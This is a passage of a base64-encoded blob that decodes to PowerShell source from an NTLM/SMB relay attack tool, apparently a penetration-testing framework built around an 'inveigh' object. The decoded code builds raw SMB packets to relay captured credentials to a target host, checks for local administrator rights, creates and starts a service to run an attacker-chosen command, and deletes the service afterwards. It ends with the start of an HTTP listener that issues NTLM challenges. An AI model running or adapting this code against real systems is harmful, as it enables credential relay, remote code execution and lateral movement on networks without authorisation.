wMCwweDAwLDB4MDAsMHgwMCwweDE4LDB4MDUsMHgyOCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDA4ICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdXNlcl9JRCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDgsMHgwMCwweDBlLDB4ZmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQwLDB4MDAsMHgwMCwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4ZmYsMHhmZiwweGZmLDB4ZmYsMHgwOCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX2J5dGVfY291bnRfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NlcnZpY2VfYnl0ZV9jb3VudF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4M2YsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX2J5dGVfY291bnRfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDA1LDB4MDAsMHgwMCwweDAzLDB4MTAsMHgwMCwweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NlcnZpY2VfYnl0ZV9jb3VudF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MGMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NvbnRleHRfaGFuZGxlciArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTUsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE1LDB4MDAsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWZlcmVudF9JRF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTUsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE1LDB4MDAsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4ZmYsMHgwMSwweDBmLDB4MDAsMHgxMCwweDAxLDB4MDAsMHgwMCwweDAzLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9jb21tYW5kX2xlbmd0aF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2NvbW1hbmRfbGVuZ3RoX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9jb21tYW5kX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICRTTUJfbXVsdGlwbGV4X2lkID0gMHgwOQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIDcKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCA9ICRTTUJfcmVsYXlfZXhlY3V0ZV9SZWFkQW5kUmVxdWVzdAogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgOAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gMHgwMCwweDAwLDB4MDAsMHg3MywweGZmLDB4NTMsMHg0ZCwweDQyLDB4MmYsMHgwMCwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgxOCwweDA1LDB4MjgsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwOCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3VzZXJfSUQgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDBhLDB4MDAsMHgwZSwweGZmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0MCwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGZmLDB4ZmYsMHhmZiwweGZmLDB4MDgsMHgwMCwweDM0LDB4MDAsMHgwMCwweDAwLDB4MzQsMHgwMCwweDNmLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgzNCwweDAwLDB4MDUsMHgwMCwweDAwLDB4MDMsMHgxMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgzNCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MWMsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDEzLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NvbnRleHRfaGFuZGxlciArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICA5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3NlbmQgPSAkU01CX3JlbGF5X2V4ZWN1dGVfUmVhZEFuZFJlcXVlc3QKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgMTAKICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gMHgwMCwweDAwLDB4MDAsMHg2YiwweGZmLDB4NTMsMHg0ZCwweDQyLDB4MmYsMHgwMCwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgxOCwweDA1LDB4MjgsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwOCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3VzZXJfSUQgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDBiLDB4MDAsMHgwZSwweGZmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0MCwweDBiLDB4MDEsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGZmLDB4ZmYsMHhmZiwweGZmLDB4MDgsMHgwMCwweDJjLDB4MDAsMHgwMCwweDAwLDB4MmMsMHgwMCwweDNmLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgyYywweDAwLDB4MDUsMHgwMCwweDAwLDB4MDMsMHgxMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgyYywweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MTQsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAyLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NvbnRleHRfaGFuZGxlcgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIDExCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gJFNNQl9yZWxheV9leGVjdXRlX1JlYWRBbmRSZXF1ZXN0CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc3RyZWFtLldyaXRlKCRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kLDAsJFNNQl9yZWxheV9leGVjdXRlX3NlbmQuTGVuZ3RoKQogICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc3RyZWFtLkZsdXNoKCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmKCRTTUJSZWxheU5ldHdvcmtUaW1lb3V0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfdGltZW91dCA9IE5ldy1UaW1lU3BhbiAtU2Vjb25kcyAkU01CUmVsYXlOZXR3b3JrVGltZW91dAogICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3N0b3B3YXRjaCA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuU3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB3aGlsZSghJFNNQl9yZWxheV9leGVjdXRlX3N0cmVhbS5EYXRhQXZhaWxhYmxlKQogICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICBpZigkU01CX3JlbGF5X2V4ZWN1dGVfc3RvcHdhdGNoLkVsYXBzZWQgLWdlICRTTUJfcmVsYXlfZXhlY3V0ZV90aW1lb3V0KQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNNQiByZWxheSB0YXJnZXQgZGlkbid0IHJlc3BvbmQgd2l0aGluICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0IHNlY29uZHMiKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgdGFyZ2V0IGRpZG4ndCByZXNwb25kIHdpdGhpbiAkU01CUmVsYXlOZXR3b3JrVGltZW91dCBzZWNvbmRzIildKQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2ZhaWxlZCA9ICR0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrIFNNQl9yZWxheV9leGVjdXRlX2xvb3AKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICgkayAtZXEgNSkgCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zdHJlYW0uUmVhZCgkU01CX3JlbGF5X2V4ZWN1dGVfYnl0ZXMsMCwkU01CX3JlbGF5X2V4ZWN1dGVfYnl0ZXMuTGVuZ3RoKQogICAgICAgICAgICAgICAgJFNNQl9jb250ZXh0X2hhbmRsZXIgPSAkU01CX3JlbGF5X2V4ZWN1dGVfYnl0ZXNbODguLjEwN10KCiAgICAgICAgICAgICAgICBpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlc1sxMDguLjExMV0pIC1lcSAnMDAtMDAtMDAtMDAnIC1hbmQgW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NvbnRleHRfaGFuZGxlcikgLW5lICcwMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMCcpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGlzIGEgbG9jYWwgYWRtaW5pc3RyYXRvciBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGlzIGEgbG9jYWwgYWRtaW5pc3RyYXRvciBvbiAkU01CUmVsYXlUYXJnZXQiKV0pCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX3JlbGF5X2V4ZWN1dGVfYnl0ZXNbMTA4Li4xMTFdKSAtZXEgJzA1LTAwLTAwLTAwJykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgaXMgbm90IGEgbG9jYWwgYWRtaW5pc3RyYXRvciBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGlzIG5vdCBhIGxvY2FsIGFkbWluaXN0cmF0b3Igb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQlJlbGF5X2ZhaWxlZF9saXN0LkFkZCgiJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2ZhaWxlZCA9ICR0cnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9mYWlsZWQgPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCgkayAtZXEgNykgLW9yICgkayAtZXEgOSkgLW9yICgkayAtZXEgMTEpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc3RyZWFtLlJlYWQoJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzLDAsJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzLkxlbmd0aCkKCiAgICAgICAgICAgICAgICBzd2l0Y2goJGspCiAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgIDcKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY29udGV4dF9oYW5kbGVyID0gJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzWzkyLi4xMTFdCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9lcnJvcl9tZXNzYWdlID0gIlNlcnZpY2UgY3JlYXRpb24gZmF1bHQgY29udGV4dCBtaXNtYXRjaCIKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIDExCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfZXJyb3JfbWVzc2FnZSA9ICJTZXJ2aWNlIHN0YXJ0IGZhdWx0IGNvbnRleHQgbWlzbWF0Y2giCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAxMwogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX2Vycm9yX21lc3NhZ2UgPSAiU2VydmljZSBkZWxldGlvbiBmYXVsdCBjb250ZXh0IG1pc21hdGNoIgogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jb250ZXh0X2hhbmRsZXJbMC4uM10pIC1uZSAnMDAtMDAtMDAtMDAnKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZmFpbGVkID0gJHRydWUKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlc1s4OC4uOTFdKSAtZXEgJzFhLTAwLTAwLTFjJykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJFNNQl9yZWxheV9leGVjdXRlX2Vycm9yX21lc3NhZ2Ugc2VydmljZSBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRTTUJfcmVsYXlfZXhlY3V0ZV9lcnJvciBvbiAkU01CUmVsYXlUYXJnZXQiKV0pCiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9mYWlsZWQgPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfSAgICAgICAgCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3N0cmVhbS5SZWFkKCRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlcywwLCRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlcy5MZW5ndGgpICAgIAogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBpZighJFNNQl9yZWxheV9mYWlsZWQgLWFuZCAkayAtZXEgNykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNNQiByZWxheSBzZXJ2aWNlICRTTUJfc2VydmljZSBjcmVhdGVkIG9uICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgY3JlYXRlZCBvbiAkU01CUmVsYXlUYXJnZXQiKV0pCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmKCghJFNNQl9yZWxheV9mYWlsZWQpIC1hbmQgKCRrIC1lcSA5KSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNNQiByZWxheSBjb21tYW5kIGxpa2VseSBleGVjdXRlZCBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IGNvbW1hbmQgbGlrZWx5IGV4ZWN1dGVkIG9uICRTTUJSZWxheVRhcmdldCIpXSkKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZigkU01CUmVsYXlBdXRvRGlzYWJsZSAtZXEgJ1knKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheSA9ICRmYWxzZQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTTUIgcmVsYXkgYXV0byBkaXNhYmxlZCBkdWUgdG8gc3VjY2VzcyIpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IGF1dG8gZGlzYWJsZWQgZHVlIHRvIHN1Y2Nlc3MiKV0pCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZighJFNNQl9yZWxheV9mYWlsZWQgLWFuZCAkayAtZXEgMTEpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgZGVsZXRlZCBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IHNlcnZpY2UgJFNNQl9zZXJ2aWNlIGRlbGV0ZWQgb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICB9ICAgCiAgICAgICAgICAgIAogICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfUmVhZEFuZFJlcXVlc3QgPSAweDAwLDB4MDAsMHgwMCwweDM3LDB4ZmYsMHg1MywweDRkLDB4NDIsMHgyZSwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDE4LDB4MDUsMHgyOCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDA4ICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdXNlcl9JRCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbXVsdGlwbGV4X0lEICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDBhLDB4ZmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg1OCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMiwweDU4LDB4MDIsMHhmZiwweGZmLDB4ZmYsMHhmZiwweDAwLDB4MDAsMHgwMCwweDAwCiAgICAgICAgICAgIAogICAgICAgICAgICBpZigkU01CX3JlbGF5X2ZhaWxlZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNNQiByZWxheSBmYWlsZWQgb24gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBmYWlsZWQgb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICAgICAgQlJFQUsgU01CX3JlbGF5X2V4ZWN1dGVfbG9vcAogICAgICAgICAgICB9CgogICAgICAgICAgICAkaysrCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDAKICAgICAgICAkU01CX3JlbGF5X3NvY2tldC5DbG9zZSgpCiAgICB9Cgp9CgojIEhUVFAvSFRUUFMgU2VydmVyIFNjcmlwdEJsb2NrIC0gSFRUUC9IVFRQUyBsaXN0ZW5lcgokSFRUUF9zY3JpcHRibG9jayA9IAp7IAogICAgcGFyYW0gKCRDaGFsbGVuZ2UsJFNNQlJlbGF5VGFyZ2V0LCRTTUJSZWxheUNvbW1hbmQsJFNNQlJlbGF5VXNlcm5hbWVzLCRTTUJSZWxheUF1dG9EaXNhYmxlLCRTTUJSZWxheU5ldHdvcmtUaW1lb3V0LCRXUEFEQXV0aCkKCiAgICBmdW5jdGlvbiBOVExNQ2hhbGxlbmdlQmFzZTY0CiAgICB7CiAgICAgICAgcGFyYW0gKFtTdHJpbmddJENoYWxsZW5nZSkKCiAgICAgICAgJEhUVFBfdGltZXN0YW1wID0gR2V0LURhdGUKICAgICAgICAkSFRUUF9